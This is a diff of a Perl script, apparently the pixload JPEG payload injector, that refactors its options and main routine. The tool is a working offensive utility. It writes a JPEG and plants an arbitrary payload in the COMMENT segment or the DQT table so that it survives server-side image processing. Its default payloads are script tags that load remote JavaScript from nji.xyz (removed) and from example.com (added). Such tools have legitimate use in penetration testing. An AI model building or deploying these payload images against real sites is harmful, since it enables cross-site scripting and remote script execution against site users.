@@ -11,87 +11,33 @@ use strict;
 use warnings;
 use feature 'say';
 
-use Getopt::Long;
-use Image::ExifTool ':Public';
 use POSIX;
+use Getopt::Long;
+use File::Basename;
 
-sub usage;
-sub create_jpg;
-sub inject_payload_to_comm;
-sub inject_payload_to_dqt;
+use constant PROGRAM => basename $0;
+use constant VERSION => 0.2;
 
-# Command line options
-GetOptions(
-    'help!'     =>  \my $help,
-    'place=s'   =>  \my $place,
-    'payload=s' =>  \my $payload,
-    'output=s'  =>  \my $outfile,
+use Image::ExifTool ':Public';
+
+# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
+#                              Default options                                #
+# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
+
+my %opts = (
+    section     => 'COM',
+    payload     => '<script src=//example.com></script>',
 );
-usage(0)     if $help;
-usage(1) unless $place and $outfile;
-
-$payload //= '<script src=//nji.xyz></script>';
-
-say <<EOF;
-[>|      JPEG Payload Creator/Injector      |<]
-
-    https://github.com/chinarulezzz/pixload
-
-EOF
-
-if (uc $place eq 'COM') {
-    create_jpg          unless -f $outfile;
-    inject_payload_to_comm;
-}
-elsif (uc $place eq 'DQT') {
-    die "The payload size must not exceed 64 bytes!\n"
-        if length($payload) > 64;
-
-    create_jpg;
-    inject_payload_to_dqt;
-}
-else {
-    die "-place option argument must be COM or DQT\n";
-}
-
-say `file       $outfile`   if -f '/usr/bin/file';
-say `hexdump -C $outfile`   if -f '/usr/bin/hexdump';
 
 # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
 #                                Subroutines                                  #
 # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
 
-sub usage {
-    say <<"EOF";
-Usage: $0 -place COM|DQT [-payload 'STRING'] -output payload.jpg
-
--place COM:
-  The payload will be injected as a 'COMMENT'.
-
-  If the output file exists, then the payload will be injected into the
-  existing file.  Else the new one will be created.
-
--place DQT:
-  The payload will be injected into 'DQT table'.
-
-  LIMITATION:
-    1. payload size must not exceed 64 bytes.
-    2. no injection support, only new file generation.
-
-  This is necessary in case the server application processes images and
-  removes comments, application-specific data, etc.
-
-  The data in DQT table must remain intact.
-
-  ! If the output file exists, then it will be rewritten. !
-EOF
-    exit +shift;
-}
 
 sub create_jpg {
     say "[>] Generating output file";
 
-    sysopen my $fh, $outfile, O_CREAT|O_WRONLY;
+    sysopen my $fh, $opts{FILE}, O_CREAT|O_WRONLY;
     syswrite   $fh, "\xff\xd8";                                # SOI
     syswrite   $fh, "\xff\xdb";                                # DQT
     syswrite   $fh, pack('S>', 67);                            # DQT SIZE
@@ -110,35 +56,103 @@ sub create_jpg {
 
     close      $fh;
 
-    say "[✔] File saved to: $outfile\n";
+    say "[✔] File saved to: $opts{FILE}\n";
 }
 
-sub inject_payload_to_comm {
+sub inject_payload_com {
     say "[>] Injecting payload into COMMENT";
 
     my $exifTool = Image::ExifTool->new;
 
-    $exifTool->SetNewValue('Comment', $payload)
+    $exifTool->SetNewValue('Comment', $opts{payload})
         or die "[✘] Fail to SetNewValue\n";
 
-    $exifTool->WriteInfo($outfile)
+    $exifTool->WriteInfo($opts{FILE})
         or die "[✘] Fail to WriteInfo\n";
 
     say "[✔] Payload was injected successfully\n";
 }
 
-sub inject_payload_to_dqt {
+sub inject_payload_dqt {
     say "[>] Injecting payload into DQT table";
 
-    my $payload_len = length $payload;
+    my $payload_len = length $opts{payload};
 
-    sysopen my $fh, $outfile, O_WRONLY;
+    sysopen my $fh, $opts{FILE}, O_WRONLY;
     sysseek    $fh, (7 + (64 - $payload_len)), SEEK_SET;
-    syswrite   $fh, $payload;
+    syswrite   $fh, $opts{payload};
     close      $fh;
 
     say "[✔] Payload was injected succesfully\n";
 }
 
+sub banner {
+    <<EOF;
+........ JPEG Payload Creator/Injector ........
+...............................................
+... https://github.com/chinarulezzz/pixload ...
+...............................................
+EOF
+}
+
+sub usage {
+    <<"EOF";
+Usage: @{[ PROGRAM ]} [OPTION]... FILE
+Hide Payload/Malicious Code in JPEG images.
+
+Mandatory arguments to long options are mandatory for short options too.
+  -s, --section COM|DQT         set section for payload injection
+  -P, --payload STRING          set payload for injection
+  -v, --version                 print version and exit
+  -h, --help                    print help and exit
+
+If the output FILE already exists, then payload will be injected into this
+existing file. Otherwise, the new one will be created.
+EOF
+}
+
+sub version {
+    PROGRAM . " " . VERSION;
+}
+
+sub main {
+    # command-line options
+    GetOptions(
+        'h|help!'     =>  \$opts{help},
+        'v|version!'  =>  \$opts{version},
+        's|section=s' =>  \$opts{section},
+        'P|payload=s' =>  \$opts{payload},
+    ) or die "$!\n";
+
+    $opts{FILE} = shift @ARGV;
+
+    say &usage    and  exit(0) if   $opts{help};
+    say &version  and  exit(0) if   $opts{version};
+    say &usage    and  exit(1) if ! $opts{FILE};
+
+    say &banner;
+    &create_jpg if ! -f $opts{FILE};
+
+    if    (uc $opts{section} eq 'COM') {
+        &create_jpg if ! -f $opts{FILE};
+        &inject_payload_com;
+    }
+    elsif (uc $opts{section} eq 'DQT') {
+        die "The payload size must not exceed 64 bytes!\n"
+            if length($opts{payload}) > 64;
+
+        &create_jpg; # FIXME: overwrites file content
+        &inject_payload_dqt;
+    }
+    else {
+        die "-s, --section option argument must be COM or DQT!\n";
+    }
+
+    say `file       $opts{FILE}`   if -f '/usr/bin/file';
+    say `hexdump -C $opts{FILE}`   if -f '/usr/bin/hexdump';
+}
+
+&main;
+
 # vim:sw=4:ts=4:sts=4:et:cc=80
-# End of file
+# End of file.
